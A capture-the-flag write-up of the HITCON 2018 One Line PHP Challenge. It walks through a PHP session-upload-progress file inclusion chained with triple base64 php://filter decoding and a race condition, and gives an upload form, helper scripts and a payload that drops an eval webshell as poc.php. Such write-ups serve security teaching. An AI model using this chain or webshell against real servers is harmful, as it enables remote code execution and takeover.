### References

- [@rai4over, HITCON 2018 One Line PHP Challenge, 2018-11-01](http://www.rai4over.cn/2018/HITCON-2018-One-Line-PHP-Challenge/)
- [@Orange, HITCON CTF 2018 - One Line PHP Challenge, 2018-10-24](http://blog.orange.tw/2018/10/hitcon-ctf-2018-one-line-php-challenge.html)
- [@kingkk, hitcon2018 One Line PHP Challenge, 2018-10-24](https://www.kingkk.com/2018/10/hitcon2018-One-Line-PHP-Challenge/)

**Tag: Session upload progress, PHP wrappers, Race condition**

1.Send POST request, and the cookie contains `PHPSESSID=JustATest`, and provide the `PHP_SESSION_UPLOAD_PROGRESS` in multipart POST data (defined in [session.upload_progress.name](https://www.php.net/manual/en/session.configuration.php#ini.session.upload-progress.name)).

while this field is included in the upload package, PHP will automatically enable Session, and since `PHPSESSID=xxxx` is set in the Cookie, the Session file will be created automatically which named `sess_JustATest`.

We can write the following form to help us constructing upload package:

```html
<html>
<body>
<form action="http://127.0.0.1/index.php" method="POST" enctype="multipart/form-data">
    <input type="hidden" name="PHP_SESSION_UPLOAD_PROGRESS" value="@<?php phpinfo();?>" />
    <input type="file" name="test" />
    <input type="submit" />
</form>
</body>
</html>
```

The content of the session file is partly controllable, and the content is as follows:

```tex
upload_progress_@<?php phpinfo();?>|a:5:{s:10:"start_time";i:1541075498;......
```

ok, this mean we need to cleanup the prefix.

2.In PHP, the `base64` will ignore invalid characters. So we combine multiple `convert.base64-decode` filter to that.

The base64 decoded needs to be a multiple of 4 characters, so we need two characters padding, run this script to brute force:

```python
import base64
import string

def decode(str):
    return base64.b64decode(base64.b64decode(base64.b64decode(str)))

s = "upload_progress_"
string_list = string.ascii_letters + string.digits

for x in string_list:
    for y in string_list:
        try:
            r = decode(s + str(x) + str(y))
        except Exception:
            pass
        else:
            if r == b'':
                print(s + str(x) + str(y))
```

Choose one of the results such as `upload_progress_cv`, this will be empty after we decode it three times:

```python
>>> import base64
>>> def decode(str):
...     return base64.b64decode(base64.b64decode(base64.b64decode(str)))
...
>>> decode('upload_progress_cv')
b''
```

3.Then we can use the following url to include the session file:

```tex
?orange=php://filter/convert.base64-decode|convert.base64-decode|convert.base64-decode/resource=/var/lib/php/sessions/sess_JustATest
```

But there is another problem that the character `=` in base64 can only be placed at the end of the code for bit-filling.

If `=` in the middle, the `convert.base64-decode` can't be resolved normally. So we need padding to improve compatibility. Run the script modified from orange:

```python
import base64

for i in range(36):
    junk = 'a' * i
    arg = PAYLOAD.encode() + junk.encode()
    x = b64encode(arg).decode()
    xx = b64encode(b64encode(arg)).decode()
    xxx = b64encode(b64encode(b64encode(arg))).decode()
    if '=' not in x and '=' not in xx and '=' not in xxx:
        xxx = 'upload_progress_cv' + xxx
        print(xxx)
        break
```

check if it can work fin:

```python
>>> decode('upload_progress_cvVVVSM0wyTkhhSGRKUjFacVlVYzRaMG96UW05alJ6bHlTbnAwYldGWGVHeFlNMEl4WkVZNWFtSXlOVEJhVnpVd1kzbG5ibU5IT1dwTWJrSnZZME5qYzFsdFJucGFWRmt3V0RKU2JGa3lPV3RhVTJkdVZVVlJOV1F5UmtsUlYyUlNVakZaZVZkV1pETmlNSEJIVDFaT1UxWnJXbGRWYkZwUFZsWmplVkp0VWt4V1JHZHlTbmxyY0U5Nk9DdFpWMFpv')
b"@<?php echo 'phpok';file_put_contents('poc.php',base64_decode('PD9waHAgQGV2YWwoJF9SRVFVRVNUW2FdKT8+'));?>aaa"
```

4.The final question is that the default `session.upload_progress.cleanup` in PHP is On. It means your upload progress in the session will be cleaned as soon as possible!

Here we use race condition to catch our data

![](https://i.imgur.com/lGHYJm2.png)
